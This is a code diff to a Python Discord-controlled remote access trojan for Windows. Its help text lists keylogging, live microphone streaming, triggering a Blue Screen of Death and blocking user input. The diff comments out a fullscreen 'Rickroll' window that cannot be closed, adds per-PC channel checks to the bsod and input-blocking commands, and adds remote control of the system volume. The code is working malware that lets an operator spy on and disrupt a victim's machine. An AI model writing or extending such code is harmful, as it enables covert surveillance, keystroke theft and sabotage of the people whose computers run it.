@@ -42,9 +42,13 @@ from PIL import ImageGrab
 import threading
 import requests
 import json
-import vlc
+#import vlc
 import tkinter as tk
 from tkinter import messagebox
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from comtypes import CLSCTX_ALL
+import numpy as np
+import cv2
 
 admin_status_file = "admin_status.txt"  # Füge diese Zeile hinzu, um die Variable zu definieren
 
@@ -53,6 +57,7 @@ user_sessions = {}
 
 intents = discord.Intents.default()
 intents.message_content = True
+intents.voice_states = True
 bot = commands.Bot(command_prefix='!', intents=intents)
 
 current_paths = {}  # Speichert den aktuellen Pfad für jeden Benutzer
@@ -231,9 +236,12 @@ async def custom_help(ctx):
     `!mic_stream_start` - Starts a live stream of the microphone to a voice channel.
     `!mic_stream_stop` - Stops the mic stream if activated.
     `!keylog <on/off>` - Activates or deactivates keylogging.
-    `!bsod` - triggers a Blue Screen of Death
+    `!bsod` - Triggers a Blue Screen of Death.
     `!rickroll` - ~you guessed it. It plays an Rickroll that is inescapable till the End.
-    `!input <block/unblock>` - completely blocks or unblocks the User Input, Mouse and Keyboard.
+    `!input <block/unblock>` - Completely blocks or unblocks the User Input, Mouse and Keyboard.
+    `!volume` - Shows volume information and available commands.
+    `!volume <mute/unmute` - Mutes or unmutes the Device.
+    `!volume <number from 1-100>` - Sets the Volume to a specific Percentage.
     """
     await ctx.send(help_text)
     
@@ -905,87 +913,93 @@ async def mic_stream_stop(ctx):
     await ctx.send(f"`[{current_time()}] Left voice-channel.`", delete_after=10)
     
 # Function to block closing the window
-def on_closing():
-    messagebox.showinfo("Nope", "You can't close this window! 😏")
+#def on_closing():
+#    messagebox.showinfo("Nope", "You can't close this window! 😏")
 
 # Function to download the video
-def download_video(url, path):
-    response = requests.get(url, stream=True)
-    total_size = int(response.headers.get('content-length', 0))
-    with open(path, 'wb') as file:
-        for chunk in response.iter_content(chunk_size=1024):
-            if chunk:
-                file.write(chunk)
+#def download_video(url, path):
+#    response = requests.get(url, stream=True)
+#    total_size = int(response.headers.get('content-length', 0))
+#    with open(path, 'wb') as file:
+#        for chunk in response.iter_content(chunk_size=1024):
+#            if chunk:
+#                file.write(chunk)
 
 # Function to play the video
-def play_video():
+#def play_video():
     # Create the main window
-    window = tk.Tk()
-    window.title("Rickroll")
-    window.attributes("-fullscreen", True)  # Fullscreen mode
-    window.attributes("-topmost", True)     # Always on top
-    window.overrideredirect(True)  # Remove title bar
-    window.protocol("WM_DELETE_WINDOW", on_closing)  # Block closing
+#    window = tk.Tk()
+#    window.title("Rickroll")
+#    window.attributes("-fullscreen", True)  # Fullscreen mode
+#    window.attributes("-topmost", True)     # Always on top
+#    window.overrideredirect(True)  # Remove title bar
+#    window.protocol("WM_DELETE_WINDOW", on_closing)  # Block closing
 
     # Frame for the VLC player
-    frame = tk.Frame(window, bg='black')
-    frame.pack(fill=tk.BOTH, expand=1)
+#    frame = tk.Frame(window, bg='black')
+#    frame.pack(fill=tk.BOTH, expand=1)
 
     # Initialize VLC player
-    instance = vlc.Instance()
-    player = instance.media_player_new()
-    media = instance.media_new(VIDEO_PATH)
-    player.set_media(media)
+#    instance = vlc.Instance()
+#    player = instance.media_player_new()
+#    media = instance.media_new(VIDEO_PATH)
+#    player.set_media(media)
 
     # Embed VLC player in the Tkinter frame
-    player.set_hwnd(frame.winfo_id())
+#    player.set_hwnd(frame.winfo_id())
 
-    def check_video_end():
-        state = player.get_state()
-        if state == vlc.State.Ended:
-            close_window()
-        else:
-            window.after(1000, check_video_end)
+#    def check_video_end():
+#        state = player.get_state()
+#        if state == vlc.State.Ended:
+#            close_window()
+#        else:
+#            window.after(1000, check_video_end)
 
-    def close_window():
-        player.stop()
-        window.destroy()
-        try:
-            os.remove(VIDEO_PATH)
-        except PermissionError:
-            print("Unable to delete the video file, it might still be in use.")
+#    def close_window():
+#        player.stop()
+#        window.destroy()
+#        try:
+#            os.remove(VIDEO_PATH)
+#        except PermissionError:
+#            print("Unable to delete the video file, it might still be in use.")
 
     # Play the video when the window opens
-    window.after(1000, player.play)
-    window.after(1000, check_video_end)
-    window.mainloop()
+#    window.after(1000, player.play)
+#    window.after(1000, check_video_end)
+#    window.mainloop()
 
 # Discord bot command to play the Rickroll video
-@bot.command(name='rickroll')
-async def rickroll(ctx):
-    working_message = await ctx.send("🎥 Preparing Rickroll...")
+#@bot.command(name='rickroll')
+#async def rickroll(ctx):
+#    if not in_correct_channel(ctx):
+#        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+#        return
+#    working_message = await ctx.send("🎥 Preparing Rickroll...")
 
-    def run_video():
-        if not os.path.exists(VIDEO_PATH):
-            download_video(VIDEO_URL, VIDEO_PATH)
-        play_video()
+#    def run_video():
+#        if not os.path.exists(VIDEO_PATH):
+#            download_video(VIDEO_URL, VIDEO_PATH)
+#        play_video()
 
     # Start the video in a new thread
-    threading.Thread(target=run_video).start()
-
-    await working_message.delete()
-    await ctx.send("Rickroll is now playing! 🎶")
+#    threading.Thread(target=run_video).start()
+#
+#    await working_message.delete()
+#    await ctx.send("Rickroll is now playing! 🎶")
 
 # Error handling
-@rickroll.error
-async def rickroll_error(ctx, error):
-    await ctx.send(f"⚠️ An error occurred: {error}", delete_after=10)
+#@rickroll.error
+#async def rickroll_error(ctx, error):
+#    await ctx.send(f"⚠️ An error occurred: {error}", delete_after=10)
     
 confirmation_pending = {}
 
 @bot.command(name='bsod')
 @commands.check(is_authorized)
 async def bsod(ctx):
+    if not in_correct_channel(ctx):
+        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        return
     confirmation_pending[ctx.author.id] = True
     await ctx.send("⚠️ Warning: You are about to trigger a Bluescreen! Type `!confirm_bsod` within 15 seconds to confirm.")
     
@@ -1046,6 +1060,9 @@ def unblock_input():
 @bot.command(name='input')
 @commands.check(is_authorized)
 async def input_command(ctx, action: str):
+    if not in_correct_channel(ctx):
+        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        return
     global input_blocked
     if action == 'block':
         if input_blocked:
@@ -1070,6 +1087,66 @@ async def input_command(ctx, action: str):
 async def input_command_error(ctx, error):
     msg = await ctx.send(f"⚠️ An error occurred: {error}")
     await msg.delete(delay=5)
+    
+# Function to get the default audio device
+def get_default_audio_device():
+    devices = AudioUtilities.GetSpeakers()
+    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+    volume = interface.QueryInterface(IAudioEndpointVolume)
+    return volume
+
+# Command to control volume
+@bot.command(name='volume')
+@commands.check(is_authorized)
+async def volume(ctx, *args):
+    volume = get_default_audio_device()
+    
+    if not args:
+        current_volume = int(volume.GetMasterVolumeLevelScalar() * 100)
+        is_muted = volume.GetMute()
+        mute_status = "Muted 🔇" if is_muted else "Unmuted 🔊"
+        
+        await ctx.send(f"🎵 **Audio Device Info:**\n"
+                       f"Device Name: Default Device\n"
+                       f"Max Volume: 100%\n"
+                       f"Current Volume: {current_volume}%\n"
+                       f"Status: {mute_status}\n\n"
+                       f"**Usage:**\n"
+                       f"`!volume` - Show volume information and available commands\n"
+                       f"`!volume [0-100]` - Set volume to a specific percentage\n"
+                       f"`!volume mute` - Mute the audio\n"
+                       f"`!volume unmute` - Unmute the audio")
+    elif args[0].isdigit():
+        new_volume = int(args[0])
+        if new_volume < 0 or new_volume > 100:
+            msg = await ctx.send("❌ **Error:** Volume must be between 0 and 100.")
+            await msg.delete(delay=10)
+        else:
+            volume.SetMasterVolumeLevelScalar(new_volume / 100.0, None)
+            await ctx.send(f"🔊 **Volume set to {new_volume}%**")
+    elif args[0] == 'mute':
+        if volume.GetMute():
+            msg = await ctx.send("❌ **Error:** The device is already muted.")
+            await msg.delete(delay=10)
+        else:
+            volume.SetMute(1, None)
+            await ctx.send("🔇 **Audio has been muted.**")
+    elif args[0] == 'unmute':
+        if not volume.GetMute():
+            msg = await ctx.send("❌ **Error:** The device is already unmuted.")
+            await msg.delete(delay=10)
+        else:
+            volume.SetMute(0, None)
+            await ctx.send("🔊 **Audio has been unmuted.**")
+    else:
+        msg = await ctx.send("❌ **Error:** Invalid command. Use `!volume`, `!volume [0-100]`, `!volume mute`, or `!volume unmute`.")
+        await msg.delete(delay=10)
+
+# Error handling
+@volume.error
+async def volume_command_error(ctx, error):
+    msg = await ctx.send(f"⚠️ **An error occurred:** {error}")
+    await msg.delete(delay=10)
 
 def main():
     time.sleep(15)
